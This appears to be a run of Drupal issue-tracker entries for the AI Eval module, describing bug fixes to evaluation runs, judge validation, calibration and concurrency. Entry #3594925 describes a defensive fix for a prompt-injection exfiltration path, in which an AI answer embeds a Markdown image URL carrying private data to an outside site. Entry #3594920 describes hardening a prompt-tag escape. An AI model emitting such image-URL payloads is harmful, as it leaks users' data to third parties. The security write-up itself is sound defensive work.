item.title: #3594928: The run box: Cancel does nothing while a progress request is open, and a run where every question errored says "Run complete · 100%"
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 35 files, +1418/−189 · php +1325/−185 · js +53/−4 · css +37 · md +3
  • Diff: 86a8117
  • Discussion: #3594928 · 1 contributor · 3 comments

Summary

Cancel on the run box, the question generation box and the judge validation box now takes effect while a step is in progress. Before, a click during an open progress request was silently dropped and the run continued to the end. A finished run now reports its counts, for example "Run complete. 28 questions, 28 errors", instead of a fixed "Run complete · 100%". If every question failed it says "All 28 questions failed" and shows the most common error. The same commit also makes imported results use their own maximum score as the scale on the results list and trend bars, shows the imported model and a read-only table of result items, and collapses saved guided test examples into short summaries (#3594927, #3594863).

Impact

No upgrade or configuration changes required.

Technical details

The progress box polls with hx-sync="this:drop", and the Cancel button inherited it, so htmx dropped the click while a progress request was open. The Cancel button in RunFragment::active(), GenerationFragment and the ValidationFragment form now has its own hx-sync="closest .ai-eval-run:replace" (or .ai-eval-gen, .ai-eval-validate), which aborts the open progress request. The issue proposed queue all, but the shipped markup uses :replace. To make aborting safe, GenerationRunner::cancelGeneration() and JudgeValidationRunner::cancelValidation() no longer take the step lock. They rely on step writes requiring an active status, so a late reply cannot advance a cancelled job. The "step is still finishing, try Cancel again" notices are removed. GenerationController now returns GenerationFragment::cancelled() if a cancel landed during its step. Validation still refuses to cancel once completed >= total and lets the next poll finalize the report.

RunFragment::complete() builds its label from total and error_count. EvalRunner::runState() adds a common_error key for complete runs where error_count === total. It takes the most frequent error_detail (falling back to error) from the run's scores_json. On the target workflow hub, RunController::completeResponse() puts the same summary in the status message shown after the redirect.

For imports, EvalResultsController::ceilingForRow() reads config_json['import']['score_max'] and falls back to the recorded native ceiling. It replaces the hardcoded / 5 in the trend bars, and noLlmJudgeScored() now treats imports as having no native judge. Imported detail pages render importedResultsTable() from envelope['evaluation_results'] instead of the annotation questions table. Guided examples render as <details class="ai-eval-guided-example"> rows, with scoped examples[N][...] field names normalized back in the JS htmx:configRequest handler.

  • Committed: November 25, 2026 (1 day later)

item.title: #3594927: Imported results: the results list draws the score on the wrong scale, and the detail page hides the model and result items and warns about a judge that did not run
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 35 files, +1418/−189 · php +1325/−185 · js +53/−4 · css +37 · md +3
  • Diff: 86a8117
  • Discussion: #3594927 · 1 contributor · 3 comments

Summary

Imported evaluation results now display correctly on the results pages. The results list and the trend bars use the imported file's own maximum score, so a 1.0 out of 1.0 import shows a full bar instead of a short red one. The detail page shows the model named in the imported file, lists the file's result items in a read-only table, and no longer warns about a judge that did not take part in the run.

Impact

No upgrade or configuration changes required.

Technical details

A new private helper EvalResultsController::ceilingForRow() returns config_json.import.score_max when it is numeric and above 0, otherwise falls back to ceilingForScoresJson(). list() and detail() both use it, replacing the inline $importCeiling logic in detail(). Trend bars previously used a hard-coded / 5; they now load config_json and scores_json for only the five visible history rows per test, in one query keyed by id, and scale by the row's ceiling.

On detail(), the "Model under test" cell shows model_info.id or else model_info.name from config_json.envelope, with "(from the imported file)". It keeps "Not reported (imported)" when neither is present. For imports, the questions table is replaced by importedResultsTable(), which lists each evaluation_results item: evaluation_name, a metric name (from metric_name, metric_id or evaluation_description), the score with its min_score to max_score scale, and score_details.details as pretty-printed JSON. File content is output through #plain_text or an inline_template context, so it is escaped. An empty envelope shows "The imported file has no result items."

noLlmJudgeScored() now returns TRUE for a row with no snapshot when config_json.import is present, so judgeTargetFamilyAdvisoryForRow() returns early and the site judge is never used as a stand-in for an imported run.

The same commit also bundles #3594928 (Cancel during a running step for runs, generations and judge validations, plus question and error counts on finished runs) and #3594863 (collapsed guided test examples). These are separate from this issue.

item.title: #3594863: Guided test shows every example as a full editor, so the Examples step is very long
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 35 files, +1418/−189 · php +1325/−185 · js +53/−4 · css +37 · md +3
  • Diff: 86a8117
  • Discussion: #3594863 · 1 contributor · 3 comments

Summary

On the guided test form, the Examples step used to turn into a long stack of full editors as soon as someone added, updated or removed one example. Saved examples now show as one-line collapsed rows (id, the start of the input, and the expectation count) that open on click. A reload and an htmx update look the same, and an example with a validation error opens by itself. When editing an existing test with an entity dataset, its questions appear as compact read-only rows rather than disabled copies of the editor. Counts now read "1 expectation" or "N expectations".

Impact

Affects module maintainers and front-end developers.

  • Theme change: Existing guided examples render as details.ai-eval-guided-example with a summary line, and edit-flow questions render as #ai-eval-guided-existing-questions rows instead of disabled fieldsets.
  • API change: GuidedExampleList::build() loses its $editExisting parameter, and GuidedExampleList::summary() is now public static with the signature summary(array $question), returning the compact text only.

Technical details

GuidedExampleList::build() had two code paths. The page load rendered summaries and the htmx fragment rendered full editors. The $editExisting flag is removed, so both callers use one path. Each existing example is a <details class="ai-eval-guided-example" data-guided-index="N"> holding the old editor, so hx-include="closest .ai-eval-guided-example" on the update and remove buttons still works. open is set when $errors[$index] is non-empty.

summary() is now a public static helper that returns the shared compact text. It uses mb_strlen/mb_substr for the 80 character cut and PluralTranslatableMarkup for the count. GuidedTestForm reuses it for the read-only existing-question rows inside a new #ai-eval-guided-existing-questions container. The disabled fieldset copies of the editor are gone.

A closed details still posts its inputs, so existing editors could leak their expectations into the no-JavaScript "Add example" submit. To prevent that, the editor sits in a fieldset that is rendered disabled and hidden. scopeFields() rewrites name and hx-params attributes to examples[INDEX][field]. The guided-test behavior in the JS file enables the fieldset only when window.htmx exists and the row is open. On htmx:configRequest and when building the request from the block, it strips the examples[N] prefix again via canonicalName(), so the shared endpoint receives the original field names. Fields in rows added by htmx are re-scoped on htmx:afterSwap. CSS for the rows is added to css/admin.css.

The same commit also ships #3594928 (Cancel during a running step) and #3594927 (imported results scaled to their maximum score), which are separate from this issue.

Upgrade

If you call the list builder yourself, remove the fifth argument. The compact page-load rendering is now the default:

// Before
GuidedExampleList::build($draftKey, $draft['examples'] ?? [], [], NULL, FALSE);
// After
GuidedExampleList::build($draftKey, $draft['examples'] ?? []);

Code that used the old private summary($question, $draftKey, $index) must use the new public GuidedExampleList::summary($question), which returns only the compact text and no remove button.

  • Committed: November 25, 2026 (22 days later)

item.title: #3594931: The fact match judge cannot be validated from the admin UI: it gets no expected facts
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 21 files, +1333/−140 · php +1283/−130 · yml +30 · md +20/−10
  • Diff: b7c930d
  • Discussion: #3594931 · 1 contributor · 3 comments

Summary

Validating a judge that has a dimension, such as fact_match_grader, from the admin UI previously found no usable examples, so the judge skipped every item and could never become trusted. Whole-answer annotations now count for such a judge when it was the only judge that attempted the annotated answer. Matching trace review labels still take precedence over annotations.

Impact

No upgrade or configuration changes required.

Technical details

HumanLabelSource::forGrader() previously merged annotation examples only when both $domainTags and $dimension were NULL. It now merges them whenever $domainTags is NULL. When a dimension is set, fromAnnotations() is called in sole-judge mode and keeps an annotated answer only if attempted_graders (graders that scored or errored) has exactly one entry. Results stored without grader_scores stay excluded as before. Domain-tagged validations still get no annotations, since annotations carry no trace tags.

The two sources are de-duplicated by a new private answerKey(), a CanonicalHasher hash of input and response. A bare single user message and its user: -prefixed trace form hash the same, while multi-turn transcripts keep their roles. Trace review examples are collected first, and an annotation on the same answer is skipped, so validation counts the answer once. Annotation examples fill only the remaining $limit.

JudgeValidateController no longer hides the unattributed annotation hint for dimension judges, and shows the whole-answer notice when the run's recorded examples (runner->scoredExamples($run)) include result-based ones.

The same commit also ships #3594929 (file or config datasets with caller_uid now error in EvalRunner::runQuestionBody() unless the run starter has run ai eval as another user) and #3594886 (with refuse_unvalidated_judges on, applyJudgeTrustPolicy() rescoring without untrusted judges; the pass stands only if the recalculated gate passes and at least half of the original questions remain measured, otherwise trust_refused is set, and a standing pass records trust_note).

item.title: #3594929: Test datasets from files can still set a caller account without the new permission
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 21 files, +1333/−140 · php +1283/−130 · yml +30 · md +20/−10
  • Diff: b7c930d
  • Discussion: #3594929 · 1 contributor · 3 comments

Summary

The restricted permission run ai eval as another user is now also enforced for questions that come from YAML file datasets, not just stored question entities. If the account that started a run lacks the permission, a file-dataset question that sets caller_uid records an error instead of switching accounts. Drush runs and older runs with no recorded starter keep working as before. The same commit also changes how refuse_unvalidated_judges works: a passing gate is now recalculated without the untrusted judges' scores, and judge validation for dimension judges uses whole-answer annotations only when that judge alone graded the answer (#3594886, #3594931).

Impact

Affects site owners.

  • Security: Closes a gap where a YAML dataset could run a question as another account, such as user 1, without the new permission. Needs server file write access, so low severity.
  • Permission change: Runs from non-entity (file or config) datasets that set caller_uid now require the run starter to have run ai eval as another user; otherwise that question records an error.

Technical details

The check lives in EvalRunner::runQuestionBody(), just before the switch to the caller account, because EvalQuestion::preSave() only covers entity questions and the runner reloads the dataset at every step, so a file can change mid-run. runQuestion() and runQuestionBody() take a new ?int $startedBy, passed from ai_eval_run.started_by. When it is non-NULL, the question's dataset_source is not entity, and the starter lacks run ai eval as another user, the runner returns questionError() with an explanatory message. A NULL starter (Drush, legacy rows) skips the check, matching the #3594906 policy. A missing dataset source defaults to file, so it is checked.

The same commit bundles two other fixes. For #3594886, applyJudgeTrustPolicy() now rescored the target without untrusted judges' scores using Scorer::scoreQuestion() and scoreTarget(). Skipped and errored questions stay in the coverage denominator. The pass stands only if the recalculated gate passes and at least half of the original questions remain measured. A dependent pass is recorded as trust_refused. An independent pass keeps the judges in a new trust_note in the config snapshot. For #3594931, HumanLabelSource uses whole-answer annotations for a dimension judge only when it was the sole attempted grader (attempted_graders), and matching trace reviews take precedence. JudgeValidateController follows suit. Docs and the settings form description were updated.

Upgrade

If you rely on YAML datasets (from dataset_path or module datasets/ folders) that set caller_uid, grant run ai eval as another user to the roles that start those runs, or remove caller_uid from the dataset.

item.title: #3594886: Untrusted-judge gate refuses passes that do not depend on the judge
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 21 files, +1333/−140 · php +1283/−130 · yml +30 · md +20/−10
  • Diff: b7c930d
  • Discussion: #3594886 · 1 contributor · 3 comments

Summary

With "Do not count a pass that rests on a judge that is not trusted" turned on, a passing run used to be recorded as failed whenever any grader was an untrusted LLM judge, even if the other graders (for example rubric checks) passed the gate on their own. Now the gate is recalculated without the untrusted judges' scores. The pass stands if the recalculated gate still passes and at least half of the original questions remain measured. Otherwise it is refused as before. The result names the untrusted judges either way.

Impact

Affects site owners.

  • Config change: Behavior of the refuse_unvalidated_judges setting changed: a passing gate is recalculated without untrusted judges' scores instead of being refused outright. Setting label and key are unchanged.

Technical details

EvalRunner::applyJudgeTrustPolicy() now takes the per-question scores, the question pass threshold, the gate metric and the must-pass grader IDs. For each question it rebuilds GradeResult objects, drops the scores of untrusted judges, and calls Scorer::scoreQuestion() again, then Scorer::scoreTarget() for the target. Original skipped questions and invocation errors are carried over unchanged. Grader errors from untrusted judges are kept, because the scorer treats any grader error as an unmeasured question. A question left with no remaining score stays in the coverage denominator, so skipped, errored and now-unscored questions all count against the half-measured requirement.

If the recalculated gate fails, behavior is as before: passed_gate is set to FALSE and trust_refused records the judges. If it passes, the original score is kept and the judges are recorded under a new trust_note key. Both keys are copied into config_snapshot through array_intersect_key() in the run, regrade and finalize paths, and the EvalRunnerInterface return shape documents trust_note. Stored scores are not altered; the recalculation only decides the verdict. The settings form description and docs (settings, running, judges pages) were updated to describe this.

The same commit also ships two unrelated fixes: file and config dataset questions with a caller_uid now error unless the run starter has run ai eval as another user (#3594929), and dimension judge validation in HumanLabelSource uses whole-answer annotations only when that judge alone attempted the answer, with matching trace reviews taking precedence (#3594931).

item.title: #3594930: Decision recording skips mixed-language questions when a short state value appears inside a word
item.description:
• Project: Drupal AI
  • Type: Minor bug report
  • Status: Fixed
  • Changes: 6 files, +84/−17 · php +77/−12 · md +7/−5
  • Diff: d9b8c6e
  • Discussion: #3594930 · 1 contributor · 3 comments

Summary

Decision recording no longer skips questions that mix Latin or digit text with Chinese, Japanese or Thai wording just because a short state value such as no or 1 appears inside a longer word like notice or 12. Sites with mixed-language questions now record more decisions for calibration. The same commit also fixes #3594830: a calibration fitted on the Answer file tab without a name is now named after the selected rubric question or the typed question wording, shortened as on the other tabs.

Impact

No upgrade or configuration changes required.

Technical details

In DecisionRecorder::containsAny() the old code switched the whole text to plain substring matching (mb_stripos) as soon as it contained any character from the scripts written without spaces. That branch is removed. Matching is now decided per needle: a short (fewer than 4 characters) Latin or digit value still gets word boundary lookarounds, but each lookaround is widened to also accept a neighbouring character from \p{Han}\p{Hiragana}\p{Katakana}\p{Thai}\p{Lao}\p{Khmer}\p{Myanmar}\p{Tibetan}. So no matches in 東京no and no東京, but not in notice or 東京_no. Values written in those scripts keep substring matching. The script list is now a shared $unseparatedScripts string. Cases were added to DecisionRecorderStateValueTest.

In CalibrationFitForm, validation now stores the rubric question (or typed instructions) as a temporary value question. On submit, an empty or whitespace only label is replaced with that question, trimmed and cut with Unicode::truncate(..., 200, TRUE, TRUE). An explicitly typed name still wins. Existing calibration names are unchanged, and older unnamed Answer file calibrations still show the model id. CalibrationFitFormSubmitTest::testAnswerImportName covers both question sources. The changelog and docs are updated.

item.title: #3594830: An unnamed calibration fitted from an answer file is listed by its model id
item.description:
• Project: Drupal AI
  • Type: Minor bug report
  • Status: Fixed
  • Changes: 6 files, +84/−17 · php +77/−12 · md +7/−5
  • Diff: d9b8c6e
  • Discussion: #3594830 · 1 contributor · 3 comments

Summary

A calibration fitted from an answer file without a name is now saved under the question it calibrates, so two calibrations for the same model no longer look identical in the Calibrations list. Decision recording also now matches a short state value such as "no" as a whole word in questions that mix in Chinese, Japanese or Thai text, instead of falling back to loose substring matching there. Existing calibrations keep their stored name.

Impact

No upgrade or configuration changes required.

Technical details

In CalibrationFitForm::validateForm() the Answer file tab now stores the question as a temporary value: the decision rubric's question when a rubric is selected, or the typed instructions when "Other wording" is chosen. On submit, an empty or whitespace-only name is replaced by that question, trimmed and cut to 200 characters with Unicode::truncate(..., 200, TRUE, TRUE) (word boundary plus ellipsis), matching the other tabs. A typed name still wins, trimmed. docs text and the CHANGELOG now say unnamed calibrations show their question on all three tabs, while older ones saved with an empty name still show the model id.

In DecisionRecorder, the separate branch that treated any text containing Han, Hiragana, Katakana, Thai, Lao, Khmer, Myanmar or Tibetan characters as substring-only was removed (follow-up #3594930 to #3594922). Short needles (under 4 characters, not themselves in those scripts) now use the whole-word regex, with the boundary lookarounds extended to also accept an adjacent character from those unseparated scripts. So no matches in 東京no and noภาษาไทย but not in Does this notice apply to 東京? or 東京_no.

item.title: #3594926: Admin text and display fixes: run pass rate label, "binary" scales, Markdown answers, internal references
item.description:
• Project: Drupal AI
  • Type: Minor bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594926 · 1 contributor · 3 comments

Summary

Six small admin text and display fixes in AI Eval. The results list column that counted runs passing the gate is now called "Gate pass rate" (with a toggletip), so it is no longer confused with "Pass rate" elsewhere, which counts measured questions. Grader checkboxes on the test forms show a plain scale such as "(0-1)" instead of "binary, 0-1", since scales like Recall at k are not binary. Answers on the result detail page are now rendered as Markdown. Issue numbers and a drupal/ai MR reference no longer appear in dashboard tooltips or in the decision rubric error. The drush ai-eval:run margin hint points to the real settings page. A workflow test shows "Edit test" instead of a guided editor link that led nowhere.

Impact

Affects front-end developers.

  • Theme change: Result detail now attaches ai_eval/markdown and renders the answer cell as Markdown-derived markup.

Technical details

The results list header in EvalResultsController uses Toggletip::term('gate-pass-rate', ...), backed by a new "Gate pass rate" glossary entry. The two duplicated graderCheckboxLabel() methods in EvalTargetForm and GuidedTestForm are replaced by one GraderCheckboxLabel::build() in src/Render/GraderCheckboxLabel.php, which formats @label (@min-@max). The docs example in the grader guide changed to "Read-only run (0-1)".

Result detail wraps the response in Markup::create(TraceReviewFragment::markdownMarkup($rawResponse)) and attaches ai_eval/markdown, the same path trace review uses. Only the helper's already-escaped output is marked safe, to avoid double escaping.

EvalRunCommand builds the settings path with Url::fromRoute('ai_eval.settings')->toString(). TargetDashboardController checks EvalTarget::MODE_WORKFLOW and links to $ai_eval_target->toUrl('edit-form') with the label "Edit test", otherwise keeps the guided link. The DecisionRubricGrader error text is now "this AI module has no Decision operation; update the AI module to a version that has it", and the (#3594721) and (#3594716) references are removed from the EvalTargetListBuilder tooltips.

The commit also bundles fixes for sibling issues #3594906 to #3594925 (permissions, update hooks, Markdown image handling and others); those are outside this issue.

item.title: #3594925: An AI answer or imported trace can make the admin's browser load an external image, which can send data to another site
item.description:
• Project: Drupal AI
  • Type: Major bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594925 · 1 contributor · 3 comments

Summary

AI answers and imported traces are rendered as Markdown in trace review and on the optimizer pages. An image in that Markdown, such as ![](https://example.com/?d=...), used to make the reviewer's browser request that address. A prompt-injected answer could put private data into the URL and also reveal the visit time and IP address to the other site. Images now load only when they come from the same site. Any other image is shown as a plain link with its alt text and address, so the reviewer can still open it on purpose. data: images stay refused. This shipped inside a larger bundled fix commit for a code review of 1.1.0-alpha10, and the release notes list it under Security.

Impact

Affects site owners.

  • Security: Markdown rendering in trace review, optimizer pages and any page using ai_eval/markdown no longer lets external or //host images load automatically, which closes a data exfiltration path via image URLs.

Technical details

There are two renderers, and both were changed. In js/markdown-render.js the IMG_SCHEMES allowlist is replaced by isLocalImage(). It strips whitespace and control characters and converts backslashes to slashes. It rejects an empty value or one starting with //, then resolves the value against window.location.href and requires an http(s) URL with the page's own origin. During sanitizing, any IMG that fails the check is replaced by an <a> whose text is alt (src). The href is set only if the source passes the existing HREF_SCHEMES check.

On the server, TraceReviewFragment::safeMarkup() now passes the CommonMark output through a new private restrictImages() before Xss::filter(). It parses the HTML and keeps an img only if its source is relative, or absolute with the same scheme, host and port as the current request. A source starting with // is never kept. Other images become a link labelled with the alt text and source. The link gets an href only for http(s) or // sources. Without CommonMark the text is still escaped, so no image appears.

The same commit adds league/commonmark (^2.4) to the module's composer.json require. The safeMarkup() docblock still describes CommonMark as not a hard dependency.

item.title: #3594924: A decision calibration fit with very few held-out rows becomes active
item.description:
• Project: Drupal AI
  • Type: Minor bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594924 · 1 contributor · 3 comments

Summary

A decision calibration fit is now activated automatically only if it was checked on at least 10 held-out answers. Before, a fit checked on only 1 or 2 held-out rows could go live, because a comparison on so few rows means little. Once active, it changed every answer of that model and question. Such a fit is now saved inactive and the calibration page says "too few held-out rows (N of 10)". An admin can still activate it by hand, and the confirmation form warns that the result is uncertain.

Impact

Affects module maintainers.

  • New API: New constant CalibrationStoreInterface::MIN_HELD_OUT_ROWS (10), the minimum held-out rows for automatic activation.

Technical details

CalibrationStore::save() now sets $active only when heldOutCount >= CalibrationStoreInterface::MIN_HELD_OUT_ROWS (10) and CalibrationVerdict::of() is not Worse. A fit that fails either test is saved inactive, so any active curve keeps applying.

The reason is not stored, so the config schema is unchanged. It is derived from held_out_count at display time. CalibrationController uses a match that checks the minimum first, then the Worse verdict, then a generic message. CalibrationSaveTrait shows a matching warning after saving, and CalibrationActivateForm adds a note about the small sample to its confirmation text. The commit also touches many unrelated areas, covered by other issues in the range #3594906 to #3594926.

item.title: #3594923: Admin forms wait for the provider model list on each load, and the results page loads up to 1,200 full rows it does not need
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594923 · 1 contributor · 3 comments

Summary

The AI Eval admin forms that offer a model picker (settings, test add and edit, guided test, judge prompt, calibration fit) now cache the provider model list for 10 minutes. Before, one slow or failing provider, such as one that retries after a 401, added 6 to 10 seconds to every load of each of these forms. The results page also stops loading the large per-question score data for up to 1,000 older results it only needed a few summary columns from, so it should stay fast as runs accumulate.

Impact

item.title: #3594922: Decision calibration skips answers when a short state value appears inside a word of the question
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594922 · 1 contributor · 3 comments

Summary

Decision calibration no longer skips recording an answer just because a short state value (such as no, 1 or a) appears inside a longer word of the question, for example no inside "notice". Previously the answer was dropped and the log claimed the wording contained state text, which left calibration with fewer answers than expected. Short values are now matched only as whole words, while values of four or more characters are still matched anywhere in the text, so the protection against storing state values is not weakened.

Impact

No upgrade or configuration changes required.

Technical details

The change is in DecisionRecorder::containsAny() in ai_eval_decision_calibration, which is now public static (it was private static) so it can be unit tested. For each state value it builds a preg_quote() pattern and runs it case-insensitively (/iu). Values shorter than 4 characters get a (?<![\p{L}\p{N}_]) lookbehind and a (?![\p{L}\p{N}_]) lookahead, each added only when the value's first or last character is a letter, digit or _. So $5 still matches in "costs $5 today" but not in "costs $50", and C# still matches in "C#support".

Scripts without word separators keep substring matching: a short value containing Han, Hiragana, Katakana, Thai, Lao, Khmer, Myanmar or Tibetan characters is never wrapped in boundaries, and a text that contains any of those characters is checked with mb_stripos() instead of the regex. Values that are not valid UTF-8 fall back to plain str_contains() on bytes, as does a text where preg_match() returns FALSE. Long values are now compared case-insensitively too, which they were not before. Tests added: RecordedDecisionTest::testStateValueBoundaries() (kernel), DecisionRecorderStateValueTest and DecisionRecorderStateTextTest::testInvalidUtf8StateValue() (unit).

The commit also bundles fixes for #3594906 to #3594926, which are covered separately.

item.title: #3594921: Concurrent requests can start duplicate runs, write a validation twice and generate questions twice
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594921 · 1 contributor · 3 comments

Summary

Two requests for the same job arriving together (two tabs, a double click, a slow network) could previously start two runs for one test, write a judge validation twice, or generate the same question twice. These races are now closed. When a start is already being handled, the user sees "A start for this test is already in progress. Try again." instead of a duplicate run. Cancelling or finishing a job while a step is still running no longer lets that step write over the result.

Impact

Affects module maintainers.

  • API change: EvalRunner::startRun(), GenerationRunner::startGeneration() and JudgeValidationRunner::startValidation() throw StartInProgressException when the start lock is busy; startValidation() throws ActiveValidationException for a judge with an active validation; finalizeValidation() throws JobBusyException when the step lock is busy.

Technical details

Start paths: EvalRunner::startRun() and GenerationRunner::startGeneration() used to fall back to an unguarded start when the lock could not be acquired and no active job existed. They now throw the new StartInProgressException (a \RuntimeException subclass). RunController::start() and GenerationController::start() catch it before the generic \RuntimeException branch that rejoins an active job. JudgeValidationRunner::startValidation() now takes an ai_eval_validation_run_start:<grader> lock and throws ActiveValidationException if the judge already has a pending or running validation with total > 0. JudgeValidateController was changed to show these refusals.

Validation: finalizeValidation() now takes the ai_eval_validation_run_step:<id> lock, rereads the run inside it, and throws \RuntimeException for a canceled run or one with unfinished steps. If the lock is busy it throws JobBusyException, so the caller can poll again. doStep() writes completed and scores_json with conditions on the completed value it read and on status IN ('pending','running').

Generation: stepGeneration() rereads the job inside the lock and returns early unless it is still pending or running. Because a step appends questions before it records progress, the progress UPDATE (conditioned on the old completed and a running status) now runs first, in the same database transaction as appendQuestions(). A stale worker whose lock expired claims zero rows and appends nothing, and an append failure rolls the transaction back. The failure path of the step has the same conditions. finalizeGeneration() and cancelGeneration() take the same ai_eval_generation_step:<id> lock. Finalize only completes a job where completed >= total, and both leave the job unchanged if the lock is held. GenerationController rereads the job after finalize and cancel, and shows progress or a "still finishing, try Cancel again" notice when the job did not reach the expected state.

This commit also bundles fixes for #3594906 to #3594926; only the concurrency part (#3594921) is described here.

Upgrade

Code that calls the runner services directly should handle the new exceptions. Catch StartInProgressException before the generic \RuntimeException that means "an active job exists":

try {
  $runId = $runner->startRun($target, $source);
}
catch (StartInProgressException) {
  // Another request holds the start lock. Ask the user to try again.
}
catch (\RuntimeException) {
  // Rejoin the active run.
}

After cancelGeneration() or finalizeGeneration(), reread the job: both do nothing while another request holds the step lock.

item.title: #3594920: LLM judge replies with extra braces fail to parse, the prompt escape misses some Unicode spaces, and one decoding refusal is not retried
item.description:
• Project: Drupal AI

  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1

  • Discussion: #3594920 · 1 contributor · 3 comments

Summary

LLM judge grading is more tolerant of real model output. Replies that mention a brace in prose before or after the JSON verdict now parse into a score instead of becoming a "could not parse judge response as JSON" error. Models that reject sending temperature and top_p together are retried with temperature only, instead of failing the question with a judge error. Unicode spaces and zero-width characters can no longer hide a closing prompt tag in an answer.

Impact

No upgrade or configuration changes required.

Technical details

In LlmJudgeBase::parseJudgeResponse(), the first-{-to-last-} slice is replaced by a single pass that pairs braces while skipping braces inside JSON strings and after escapes. Each paired span is run through json_decode(), and the last decoded object that has score wins. A fallback retries opening braces after an unmatched quote in prose, under a shared scan budget. The existing score and scale checks are unchanged. An array reason now becomes an empty string instead of "Array" with a warning.

escapePromptValue() now uses the /u flag with [\s\p{Z}\p{Cf}] in place of the \xC2\xA0 byte alternative, so U+2000 style spaces and U+200B or U+FEFF no longer defeat the closing-tag escape. If preg_replace() returns NULL (invalid UTF-8), every < is escaped rather than returning the raw value.

For decoding pins, refusesPinnedKnob() now also accepts a message such as "temperature and top_p cannot both be specified" (new refusesCombinedPins()). The retry then sets temperature to 0, drops top_p, and records ['temperature'] as the pinned setting. The static $pinRefused map changed from a boolean per provider and model to a list of allowed knobs, so later grader instances in the same process pin temperature only. An empty list keeps the old no-pin behaviour, which is used when temperature itself is refused or the temperature-only retry is also refused. The same commit also changes LlmJudgeBase to implement ValidationSettingsReportingInterface through validationSettingsFingerprint(), which belongs to #3594919 rather than this fix. item.title: #3594919: A judge stays trusted after some changes that affect its scores, and validation gives the judge less than a real run does
item.description:
• Project: Drupal AI
  • Type: Normal bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594919 · 1 contributor · 3 comments

Summary

A validated judge now goes stale when settings that change its scores are edited. For the decision rubric that means its question, rules, scoring points and pass score. For LLM judges it means judge_response_char_limit and pin_judge_decoding. Judge validation also gives the judge the criteria and expected facts a real run supplies, so a fact_match validation can now produce scores. A validation whose steps ran with different settings or prompt versions, including a prompt override deleted mid-run, can no longer count as trusted. Run database updates and re-validate judges whose trust shows as stale. Labeled items created before this change have no stored criteria or facts, and the validation report says so.

Impact

Affects module maintainers and site owners.

  • Database update: ai_eval_update_10054() adds a nullable settings_fingerprint varchar(64) column to ai_eval_judge_validation; old rows keep their state.
  • New API: New ValidationSettingsFingerprint class and ValidationSettingsReportingInterface; LabeledExample gains $criteria and $expectedFacts; JudgeValidationStoreInterface gains validatedSettingsMatch() and persist() takes a $settingsFingerprint argument.

Technical details

Each validation step now records a fingerprint from ValidationSettingsFingerprint: llm() hashes the response char limit and the pin-decoding flag, and decision() hashes DecisionRubric::fingerprint() plus pointsPerError and passScore. The two extra values are kept out of the rubric's own fingerprint, so calibration identity is unchanged. Graders expose it through the new ValidationSettingsReportingInterface, implemented by LlmJudgeBase and DecisionRubricGrader. JudgeValidationRunner::finalizeValidation() collapses the step fingerprints to one value, or ValidationSettingsFingerprint::MIXED when they differ, and stores it in the new settings_fingerprint column.

JudgeValidationStore::validatedSettingsMatch() compares the stored fingerprint with the current config (ai_eval.decision_rubric or ai_eval.settings). A mismatch makes the trust state STATE_STALE. It returns NULL for rows with no fingerprint, which keeps their state; fixture-file validations never run the judge, so they have none. JudgeTrustReason shows 'Validated with different judge settings' or 'Judge settings changed between validation steps'.

JudgeValidationReport gets configurationConsistent and missingContext. trustBlocker() returns the new BLOCKER_CONFIGURATION when steps recorded more than one config version (or MIXED settings). This covers versions like [1, 0], which the old min() ?: NULL collapsed to no version. The runner builds the report from the stored steps.

LabeledExample, LabelFixture, HumanLabelSource and the runner's stored labels now carry criteria and expected_facts (NULL when not recorded). The runner passes them to grade() instead of criteria: ''. LabelFixture rejects a non-string criteria or non-array expected_facts. The ai-eval:sample-traces command also exports both fields.

The same commit bundles fixes for #3594906 through #3594926, so unrelated changes appear in the diff.

Run database updates (drush updb). ai_eval_update_10054() adds the column:

$schema->addField($table, 'settings_fingerprint', $definitions[$table]['fields']['settings_fingerprint']);

item.title: #3594918: A rubric check set that fails its threshold gives a passing grader score, and some check errors are wrong or silent
item.description:
• Project: Drupal AI
  • Type: Major bug report
  • Status: Fixed
  • Changes: 187 files, +7669/−683 · php +7397/−638 · js +178/−29 · md +60/−6 · yml +28/−9 · txt +4 · json +2/−1
  • Diff: d502d17
  • Discussion: #3594918 · 1 contributor · 3 comments

Summary

